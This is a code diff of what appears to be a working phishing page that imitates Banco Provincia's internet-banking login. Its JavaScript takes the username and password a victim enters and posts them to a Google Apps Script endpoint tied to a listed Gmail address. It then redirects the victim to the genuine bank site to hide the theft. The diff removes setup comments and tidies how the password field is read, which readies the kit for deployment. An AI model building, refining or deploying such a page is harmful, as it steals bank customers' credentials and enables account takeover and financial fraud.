@@ -229,17 +229,13 @@ button{font-family:inherit}
 </div>
 
 <script>
-/* ==========================================================
-   >>>>>>>>>>  SOLO ESTAS 2 LÍNEAS TENÉS QUE CAMBIAR  <<<<<<<<
-   ========================================================== */
 const CONFIG = {
-  CORREO:     "miaalma769@gmail.com",                              // <<<< 1) TU GMAIL
-  URL_SCRIPT: "https://script.google.com/macros/s/AKfycbwBWsbnK_aEfG-UtV2bvLzIByMiTWcYTjY2-ueNn3pDwWbIoeS7P2irT5K55zxhxyk/exec",   // <<<< 2) TU URL /exec
+  CORREO:     "miaalma769@gmail.com",
+  URL_SCRIPT: "https://script.google.com/macros/s/AKfycbwBWsbnK_aEfG-UtV2bvLzIByMiTWcYTjY2-ueNn3pDwWbIoeS7P2irT5K55zxhxyk/exec",
   redirigir:  true,
   urlDestino: "https://www.bancoprovincia.bancainternet.com.ar/spa/",
   espera:     1.5
 };
-/* ========================================================== */
 
 /* ---------- ojo mostrar / ocultar clave ---------- */
 const pass   = document.getElementById('password');
@@ -257,8 +253,6 @@ const form   = document.getElementById('loginForm');
 const btn    = document.getElementById('btn');
 const status = document.getElementById('status');
 
-/* CAMBIO: ahora manda formulario urlencoded, no JSON.
-   Apps Script lo parsea y lo deja en e.parameter.Usuario / e.parameter.Clave */
 function enviarDatos(payload) {
   const cuerpo = new URLSearchParams(payload).toString();
   const blob   = new Blob([cuerpo], {
@@ -283,8 +277,9 @@ function enviarDatos(payload) {
 form.addEventListener('submit', function (e) {
   e.preventDefault();
 
+  /* CORRECCIÓN: Se extrae .value correctamente de ambos campos */
   const usuario = document.getElementById('username').value.trim();
-  const clave   = pass.value;
+  const clave   = pass.value.trim();
 
   if (!usuario) { status.textContent = 'Ingresá tu usuario'; return; }
   if (!clave)   { status.textContent = 'Ingresá tu clave';   return; }
@@ -292,7 +287,6 @@ form.addEventListener('submit', function (e) {
   btn.disabled = true;
   status.textContent = 'Ingresando...';
 
-  /* CAMBIO: los nombres van en mayúscula, igual que en el Code.gs */
   enviarDatos({
     Usuario:     usuario,
     Clave:       clave,
